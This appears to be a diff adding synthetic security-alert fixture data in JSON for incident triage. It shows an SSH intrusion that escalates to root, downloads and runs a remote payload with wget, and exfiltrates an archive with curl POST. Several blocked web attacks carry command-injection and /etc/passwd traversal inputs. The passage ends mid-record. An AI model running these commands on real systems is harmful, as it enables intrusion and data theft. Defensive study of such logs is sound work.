@@ -1,0 +1,982 @@
+[
+  {
+    "alert_id": "ee1b9a0dc525",
+    "alert_type": "ssh_brute_force",
+    "severity": "high",
+    "timestamp": "2024-01-12T08:15:21Z",
+    "source_ip": "185.122.21.55",
+    "destination_ip": "203.0.113.50",
+    "event_action": "failed_login",
+    "event_type": "ssh",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "Failed password for invalid user admin from 185.122.21.55 port 45811 ssh2",
+      "@timestamp": "2024-01-12T08:15:21Z",
+      "event.action": "failed_login",
+      "event.type": "ssh",
+      "source.ip": "185.122.21.55",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "5cf57e77226d",
+    "alert_type": "ssh_brute_force",
+    "severity": "high",
+    "timestamp": "2024-01-12T08:15:23Z",
+    "source_ip": "185.122.21.55",
+    "destination_ip": "203.0.113.50",
+    "event_action": "failed_login",
+    "event_type": "ssh",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "Failed password for root from 185.122.21.55 port 45812 ssh2",
+      "@timestamp": "2024-01-12T08:15:23Z",
+      "event.action": "failed_login",
+      "event.type": "ssh",
+      "source.ip": "185.122.21.55",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "be2fb019821a",
+    "alert_type": "ssh_successful_login",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:16:15Z",
+    "source_ip": "185.122.21.55",
+    "destination_ip": "203.0.113.50",
+    "event_action": "successful_login",
+    "event_type": "ssh",
+    "user_name": "developer",
+    "linked_log": {
+      "log.original": "Accepted password for developer from 185.122.21.55 port 45821 ssh2",
+      "@timestamp": "2024-01-12T08:16:15Z",
+      "event.action": "successful_login",
+      "event.type": "ssh",
+      "source.ip": "185.122.21.55",
+      "destination.ip": "203.0.113.50",
+      "user.name": "developer"
+    }
+  },
+  {
+    "alert_id": "16b979e8c78d",
+    "alert_type": "privilege_escalation_attempt",
+    "severity": "high",
+    "timestamp": "2024-01-12T08:17:02Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_attempt",
+    "event_type": "sudo",
+    "user_name": "developer",
+    "linked_log": {
+      "log.original": "sudo: developer : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/bash",
+      "@timestamp": "2024-01-12T08:17:02Z",
+      "event.action": "privilege_escalation_attempt",
+      "event.type": "sudo",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "developer"
+    }
+  },
+  {
+    "alert_id": "feb016ac4d16",
+    "alert_type": "privilege_escalation_success",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:17:15Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "sudo",
+    "user_name": "developer",
+    "linked_log": {
+      "log.original": "sudo: pam_unix(sudo:session): session opened for user root by developer(uid=1002)",
+      "@timestamp": "2024-01-12T08:17:15Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "sudo",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "developer"
+    }
+  },
+  {
+    "alert_id": "23d18b97b121",
+    "alert_type": "malware_download",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:02Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "185.122.21.55",
+    "event_action": "download",
+    "event_type": "file_download",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "wget http://185.122.21.55/payload.sh -O /tmp/payload.sh",
+      "@timestamp": "2024-01-12T08:18:02Z",
+      "event.action": "download",
+      "event.type": "file_download",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "185.122.21.55",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "2629b9f69094",
+    "alert_type": "malware_execution",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:05Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "execution",
+    "event_type": "process",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "chmod +x /tmp/payload.sh && /tmp/payload.sh",
+      "@timestamp": "2024-01-12T08:18:05Z",
+      "event.action": "execution",
+      "event.type": "process",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "0807781bfe91",
+    "alert_type": "data_exfiltration",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:30Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "185.122.21.55",
+    "event_action": "exfiltration",
+    "event_type": "network_traffic",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "curl -X POST -F \"file=@/tmp/logs_backup.tar.gz\" http://185.122.21.55/upload",
+      "@timestamp": "2024-01-12T08:18:30Z",
+      "event.action": "exfiltration",
+      "event.type": "network_traffic",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "185.122.21.55",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "ae1185007ea7",
+    "alert_type": "suspicious_data_collection",
+    "severity": "high",
+    "timestamp": "2024-01-12T08:18:22Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "compression",
+    "event_type": "file_operation",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "tar -czf /tmp/logs_backup.tar.gz /var/www/html/logs/",
+      "@timestamp": "2024-01-12T08:18:22Z",
+      "event.action": "compression",
+      "event.type": "file_operation",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "3a4a0b38b94a",
+    "alert_type": "ssh_successful_login",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:20:45Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "successful_login",
+    "event_type": "ssh",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "Accepted publickey for admin from 192.168.1.100 port 52341 ssh2",
+      "@timestamp": "2024-01-12T09:20:45Z",
+      "event.action": "successful_login",
+      "event.type": "ssh",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "212fb56ae8e2",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:25:12Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "sudo",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "sudo: admin : TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/apt update",
+      "@timestamp": "2024-01-12T09:25:12Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "sudo",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "98862b07c731",
+    "alert_type": "file_compression",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:30:22Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "compression",
+    "event_type": "scheduled_task",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "cron[7823]: (root) CMD (tar -czf /home/backups/daily.tar.gz /var/log/)",
+      "@timestamp": "2024-01-12T09:30:22Z",
+      "event.action": "compression",
+      "event.type": "scheduled_task",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "74ed499a8916",
+    "alert_type": "ssh_brute_force",
+    "severity": "low",
+    "timestamp": "2024-01-12T10:15:33Z",
+    "source_ip": "203.45.67.89",
+    "destination_ip": "203.0.113.50",
+    "event_action": "failed_login",
+    "event_type": "ssh",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "Failed password for invalid user guest from 203.45.67.89 port 38234 ssh2",
+      "@timestamp": "2024-01-12T10:15:33Z",
+      "event.action": "failed_login",
+      "event.type": "ssh",
+      "source.ip": "203.45.67.89",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "65e88313072f",
+    "alert_type": "sql_injection_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T11:30:22Z",
+    "source_ip": "198.76.54.32",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "sql_injection",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY SQL_INJECTION attempt from 198.76.54.32 to /api/login",
+      "@timestamp": "2024-01-12T11:30:22Z",
+      "event.action": "blocked",
+      "event.type": "sql_injection",
+      "source.ip": "198.76.54.32",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "3a520a56af90",
+    "alert_type": "xss_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T11:35:45Z",
+    "source_ip": "212.34.56.78",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "xss_attempt",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] DENY XSS_PAYLOAD attempt from 212.34.56.78 to /search",
+      "@timestamp": "2024-01-12T11:35:45Z",
+      "event.action": "blocked",
+      "event.type": "xss_attempt",
+      "source.ip": "212.34.56.78",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "8d285da525f6",
+    "alert_type": "suspicious_outbound_connection",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:30Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "185.122.21.55",
+    "event_action": "allow",
+    "event_type": "network_traffic",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "[FIREWALL] ALLOW TCP 203.0.113.50:52342 -> 185.122.21.55:80 (HTTP)",
+      "@timestamp": "2024-01-12T08:18:30Z",
+      "event.action": "allow",
+      "event.type": "network_traffic",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "185.122.21.55",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "58fbafdf0347",
+    "alert_type": "malware_download",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:05Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "185.122.21.55",
+    "event_action": "download",
+    "event_type": "http_request",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "203.0.113.50 - - [12/Jan/2024:08:18:05] \"GET /payload.sh HTTP/1.1\" 200 1024 \"-\" \"wget/1.20.3\"",
+      "@timestamp": "2024-01-12T08:18:05Z",
+      "event.action": "download",
+      "event.type": "http_request",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "185.122.21.55",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "908d548abd98",
+    "alert_type": "data_exfiltration",
+    "severity": "critical",
+    "timestamp": "2024-01-12T08:18:30Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "185.122.21.55",
+    "event_action": "upload",
+    "event_type": "http_request",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "203.0.113.50 - - [12/Jan/2024:08:18:30] \"POST /upload HTTP/1.1\" 200 512 \"-\" \"curl/7.68.0\"",
+      "@timestamp": "2024-01-12T08:18:30Z",
+      "event.action": "upload",
+      "event.type": "http_request",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "185.122.21.55",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "a127c8d2a2af",
+    "alert_type": "http_request",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:20:45Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "request",
+    "event_type": "http_request",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "192.168.1.100 - - [12/Jan/2024:09:20:45] \"GET /index.html HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\"",
+      "@timestamp": "2024-01-12T09:20:45Z",
+      "event.action": "request",
+      "event.type": "http_request",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "87148f6d7c17",
+    "alert_type": "ssh_successful_login",
+    "severity": "low",
+    "timestamp": "2024-01-12T07:30:12Z",
+    "source_ip": "192.168.1.105",
+    "destination_ip": "203.0.113.50",
+    "event_action": "successful_login",
+    "event_type": "ssh",
+    "user_name": "devops",
+    "linked_log": {
+      "log.original": "Accepted publickey for devops from 192.168.1.105 port 43221 ssh2",
+      "@timestamp": "2024-01-12T07:30:12Z",
+      "event.action": "successful_login",
+      "event.type": "ssh",
+      "source.ip": "192.168.1.105",
+      "destination.ip": "203.0.113.50",
+      "user.name": "devops"
+    }
+  },
+  {
+    "alert_id": "4d0b78d67058",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T07:45:33Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "sudo",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "sudo: admin : TTY=pts/3 ; USER=root ; COMMAND=/usr/bin/apt upgrade -y",
+      "@timestamp": "2024-01-12T07:45:33Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "sudo",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "2897b3c51042",
+    "alert_type": "file_compression",
+    "severity": "low",
+    "timestamp": "2024-01-12T06:00:05Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "compression",
+    "event_type": "scheduled_task",
+    "user_name": "postgres",
+    "linked_log": {
+      "log.original": "cron[9012]: (postgres) CMD (pg_dump dbname | gzip > /backups/db_$(date +%Y%m%d).sql.gz)",
+      "@timestamp": "2024-01-12T06:00:05Z",
+      "event.action": "compression",
+      "event.type": "scheduled_task",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "postgres"
+    }
+  },
+  {
+    "alert_id": "ccd9f7528a1d",
+    "alert_type": "http_request",
+    "severity": "low",
+    "timestamp": "2024-01-12T07:45:35Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "91.189.88.152",
+    "event_action": "download",
+    "event_type": "http_request",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "203.0.113.50 - - [12/Jan/2024:07:45:35] \"GET /ubuntu/pool/main/nginx.deb HTTP/1.1\" 200 8192 \"-\" \"apt/2.0.2\"",
+      "@timestamp": "2024-01-12T07:45:35Z",
+      "event.action": "download",
+      "event.type": "http_request",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "91.189.88.152",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "55c307631a63",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T08:00:22Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "sudo",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "sudo: admin : TTY=pts/2 ; USER=root ; COMMAND=/bin/systemctl restart nginx",
+      "@timestamp": "2024-01-12T08:00:22Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "sudo",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "3ea6094f796b",
+    "alert_type": "file_compression",
+    "severity": "low",
+    "timestamp": "2024-01-12T06:25:15Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "compression",
+    "event_type": "scheduled_task",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "logrotate[4523]: (root) CMD (gzip /var/log/syslog.1)",
+      "@timestamp": "2024-01-12T06:25:15Z",
+      "event.action": "compression",
+      "event.type": "scheduled_task",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "1ee41aeb0242",
+    "alert_type": "ssh_successful_login",
+    "severity": "low",
+    "timestamp": "2024-01-12T08:05:00Z",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "203.0.113.50",
+    "event_action": "successful_login",
+    "event_type": "ssh",
+    "user_name": "monitor",
+    "linked_log": {
+      "log.original": "Accepted publickey for monitor from 192.168.1.200 port 55123 ssh2",
+      "@timestamp": "2024-01-12T08:05:00Z",
+      "event.action": "successful_login",
+      "event.type": "ssh",
+      "source.ip": "192.168.1.200",
+      "destination.ip": "203.0.113.50",
+      "user.name": "monitor"
+    }
+  },
+  {
+    "alert_id": "59a774f3caee",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T05:00:00Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "scheduled_task",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "cron[8234]: (root) CMD (/usr/bin/clamscan -r /var/www/html)",
+      "@timestamp": "2024-01-12T05:00:00Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "scheduled_task",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "3aa6defbcb26",
+    "alert_type": "http_request",
+    "severity": "low",
+    "timestamp": "2024-01-12T08:10:00Z",
+    "source_ip": "192.168.1.200",
+    "destination_ip": "203.0.113.50",
+    "event_action": "request",
+    "event_type": "http_request",
+    "user_name": "monitor",
+    "linked_log": {
+      "log.original": "192.168.1.200 - - [12/Jan/2024:08:10:00] \"GET /api/health HTTP/1.1\" 200 128 \"-\" \"Nagios/4.4.5\"",
+      "@timestamp": "2024-01-12T08:10:00Z",
+      "event.action": "request",
+      "event.type": "http_request",
+      "source.ip": "192.168.1.200",
+      "destination.ip": "203.0.113.50",
+      "user.name": "monitor"
+    }
+  },
+  {
+    "alert_id": "91da85e5b63c",
+    "alert_type": "file_transfer",
+    "severity": "low",
+    "timestamp": "2024-01-12T07:15:33Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "transfer",
+    "event_type": "file_transfer",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "scp: root@192.168.1.100 -> root@203.0.113.50:/tmp/config.tar.gz",
+      "@timestamp": "2024-01-12T07:15:33Z",
+      "event.action": "transfer",
+      "event.type": "file_transfer",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "ad31b20c9b79",
+    "alert_type": "port_scan",
+    "severity": "low",
+    "timestamp": "2024-01-12T10:22:45Z",
+    "source_ip": "198.51.100.23",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "port_scan",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY PORT_SCAN from 198.51.100.23 scanning ports 20-1024",
+      "@timestamp": "2024-01-12T10:22:45Z",
+      "event.action": "blocked",
+      "event.type": "port_scan",
+      "source.ip": "198.51.100.23",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "4cc410e05e72",
+    "alert_type": "directory_traversal",
+    "severity": "low",
+    "timestamp": "2024-01-12T11:40:12Z",
+    "source_ip": "203.98.76.54",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "directory_traversal",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] DENY PATH_TRAVERSAL from 203.98.76.54 to /../../etc/passwd",
+      "@timestamp": "2024-01-12T11:40:12Z",
+      "event.action": "blocked",
+      "event.type": "directory_traversal",
+      "source.ip": "203.98.76.54",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "a1411481698d",
+    "alert_type": "command_injection",
+    "severity": "low",
+    "timestamp": "2024-01-12T11:45:23Z",
+    "source_ip": "198.76.54.32",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "command_injection",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] DENY CMD_INJECTION from 198.76.54.32 to /api/ping?host=8.8.8.8;cat%20/etc/passwd",
+      "@timestamp": "2024-01-12T11:45:23Z",
+      "event.action": "blocked",
+      "event.type": "command_injection",
+      "source.ip": "198.76.54.32",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "724ccd3f937f",
+    "alert_type": "ssh_brute_force",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:15:44Z",
+    "source_ip": "104.223.45.67",
+    "destination_ip": "203.0.113.50",
+    "event_action": "failed_login",
+    "event_type": "ssh",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "Failed password for invalid user test from 104.223.45.67 port 22334 ssh2",
+      "@timestamp": "2024-01-12T09:15:44Z",
+      "event.action": "failed_login",
+      "event.type": "ssh",
+      "source.ip": "104.223.45.67",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "1c8a999f0e53",
+    "alert_type": "xxe_attack",
+    "severity": "low",
+    "timestamp": "2024-01-12T11:50:33Z",
+    "source_ip": "212.34.56.78",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "xxe_attack",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] DENY XXE_PAYLOAD from 212.34.56.78 to /api/upload",
+      "@timestamp": "2024-01-12T11:50:33Z",
+      "event.action": "blocked",
+      "event.type": "xxe_attack",
+      "source.ip": "212.34.56.78",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "834597db07e8",
+    "alert_type": "ldap_injection",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:00:12Z",
+    "source_ip": "198.51.100.45",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "ldap_injection",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY LDAP_INJECTION from 198.51.100.45 to /auth/login",
+      "@timestamp": "2024-01-12T12:00:12Z",
+      "event.action": "blocked",
+      "event.type": "ldap_injection",
+      "source.ip": "198.51.100.45",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "9edbce02291f",
+    "alert_type": "malicious_file_upload",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:05:45Z",
+    "source_ip": "203.45.67.89",
+    "destination_ip": "203.0.113.50",
+    "event_action": "quarantined",
+    "event_type": "file_upload",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] QUARANTINE malicious.php.jpg from 203.45.67.89 to /uploads/",
+      "@timestamp": "2024-01-12T12:05:45Z",
+      "event.action": "quarantined",
+      "event.type": "file_upload",
+      "source.ip": "203.45.67.89",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "9c7ad903c91c",
+    "alert_type": "ssh_successful_login",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:30:15Z",
+    "source_ip": "192.168.1.150",
+    "destination_ip": "203.0.113.50",
+    "event_action": "successful_login",
+    "event_type": "ssh",
+    "user_name": "dev_john",
+    "linked_log": {
+      "log.original": "Accepted publickey for dev_john from 192.168.1.150 port 48822 ssh2",
+      "@timestamp": "2024-01-12T09:30:15Z",
+      "event.action": "successful_login",
+      "event.type": "ssh",
+      "source.ip": "192.168.1.150",
+      "destination.ip": "203.0.113.50",
+      "user.name": "dev_john"
+    }
+  },
+  {
+    "alert_id": "be835178448e",
+    "alert_type": "http_request",
+    "severity": "low",
+    "timestamp": "2024-01-12T09:35:22Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "140.82.113.3",
+    "event_action": "request",
+    "event_type": "http_request",
+    "user_name": "dev_john",
+    "linked_log": {
+      "log.original": "203.0.113.50 - - [12/Jan/2024:09:35:22] \"GET /repo/project.git HTTP/1.1\" 200 4096 \"-\" \"git/2.25.1\"",
+      "@timestamp": "2024-01-12T09:35:22Z",
+      "event.action": "request",
+      "event.type": "http_request",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "140.82.113.3",
+      "user.name": "dev_john"
+    }
+  },
+  {
+    "alert_id": "2312b003d652",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T10:00:45Z",
+    "source_ip": "192.168.1.100",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "sudo",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080/tcp",
+      "@timestamp": "2024-01-12T10:00:45Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "sudo",
+      "source.ip": "192.168.1.100",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "22daf97e96ad",
+    "alert_type": "privilege_escalation_success",
+    "severity": "low",
+    "timestamp": "2024-01-12T04:00:00Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "203.0.113.50",
+    "event_action": "privilege_escalation_success",
+    "event_type": "scheduled_task",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "cron[7123]: (root) CMD (/usr/bin/certbot renew --quiet)",
+      "@timestamp": "2024-01-12T04:00:00Z",
+      "event.action": "privilege_escalation_success",
+      "event.type": "scheduled_task",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "93890d248289",
+    "alert_type": "dns_query",
+    "severity": "low",
+    "timestamp": "2024-01-12T08:15:00Z",
+    "source_ip": "203.0.113.50",
+    "destination_ip": "8.8.8.8",
+    "event_action": "query",
+    "event_type": "dns",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "query: api.example.com IN A from 203.0.113.50",
+      "@timestamp": "2024-01-12T08:15:00Z",
+      "event.action": "query",
+      "event.type": "dns",
+      "source.ip": "203.0.113.50",
+      "destination.ip": "8.8.8.8",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "d4a9aacbf40c",
+    "alert_type": "ddos_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:10:33Z",
+    "source_ip": "198.51.100.67",
+    "destination_ip": "203.0.113.50",
+    "event_action": "rate_limited",
+    "event_type": "ddos",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[RATE_LIMIT] DENY excessive requests from 198.51.100.67 (500 req/sec)",
+      "@timestamp": "2024-01-12T12:10:33Z",
+      "event.action": "rate_limited",
+      "event.type": "ddos",
+      "source.ip": "198.51.100.67",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "d98be13d56ca",
+    "alert_type": "ssh_brute_force",
+    "severity": "low",
+    "timestamp": "2024-01-12T10:45:12Z",
+    "source_ip": "45.76.123.89",
+    "destination_ip": "203.0.113.50",
+    "event_action": "failed_login",
+    "event_type": "ssh",
+    "user_name": "root",
+    "linked_log": {
+      "log.original": "Failed publickey for root from 45.76.123.89 port 33445 ssh2",
+      "@timestamp": "2024-01-12T10:45:12Z",
+      "event.action": "failed_login",
+      "event.type": "ssh",
+      "source.ip": "45.76.123.89",
+      "destination.ip": "203.0.113.50",
+      "user.name": "root"
+    }
+  },
+  {
+    "alert_id": "3f1886647596",
+    "alert_type": "csrf_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:15:22Z",
+    "source_ip": "203.98.76.54",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "csrf_attempt",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[WAF] DENY CSRF_INVALID_TOKEN from 203.98.76.54 to /api/transfer",
+      "@timestamp": "2024-01-12T12:15:22Z",
+      "event.action": "blocked",
+      "event.type": "csrf_attempt",
+      "source.ip": "203.98.76.54",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "43e02d4ae672",
+    "alert_type": "buffer_overflow",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:20:45Z",
+    "source_ip": "198.76.54.32",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "buffer_overflow",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY BUFFER_OVERFLOW from 198.76.54.32 to /cgi-bin/vulnerable",
+      "@timestamp": "2024-01-12T12:20:45Z",
+      "event.action": "blocked",
+      "event.type": "buffer_overflow",
+      "source.ip": "198.76.54.32",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "7d62b203344e",
+    "alert_type": "reverse_shell_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:25:33Z",
+    "source_ip": "212.34.56.78",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "reverse_shell",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY REVERSE_SHELL from 212.34.56.78 to /api/exec",
+      "@timestamp": "2024-01-12T12:25:33Z",
+      "event.action": "blocked",
+      "event.type": "reverse_shell",
+      "source.ip": "212.34.56.78",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "e649cdb1969b",
+    "alert_type": "credential_stuffing",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:30:12Z",
